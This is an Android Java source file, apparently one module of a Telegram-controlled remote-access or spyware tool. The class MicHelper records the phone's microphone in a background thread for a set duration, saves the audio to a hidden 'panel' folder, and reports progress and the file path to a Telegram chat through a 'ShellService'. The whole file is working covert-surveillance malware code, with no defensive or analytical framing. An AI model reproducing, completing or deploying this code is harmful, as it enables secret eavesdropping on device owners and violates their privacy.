package com.java.panel;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Environment;
import java.io.File;

public class MicHelper {

    public static void startRecording(Context context, int durationSeconds, String chatId) {
        new Thread(() -> {
            MediaRecorder recorder = null;
            try {
                File dir = new File(Environment.getExternalStorageDirectory(), "/panel");
                if (!dir.exists()) dir.mkdirs();

                String filePath = dir.getAbsolutePath() + "/mic_" + System.currentTimeMillis() + ".3gp";

                recorder = new MediaRecorder();
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                recorder.setOutputFile(filePath);
                recorder.prepare();
                recorder.start();

                if (ShellService.instance != null) {
                    ShellService.instance.sendTelegramMessage(chatId, "🎤 Started " + durationSeconds + "-second background audio recording...");
                }

                Thread.sleep(durationSeconds * 1000L);

                try {
                    if (recorder != null) {
                        recorder.stop();
                        recorder.release();
                        recorder = null;
                    }
                } catch (Exception ignored) {}

                if (ShellService.instance != null) {
                    ShellService.instance.sendTelegramMessage(chatId, "🎤 Audio recording completed:\n" + filePath);
                }

            } catch (Exception e) {
                try {
                    if (recorder != null) {
                        recorder.release();
                    }
                } catch (Exception ignored) {}

                if (ShellService.instance != null) {
                    ShellService.instance.sendTelegramMessage(chatId, "❌ Microphone error: " + e.getMessage());
                }
            }
        }).start();
    }
}
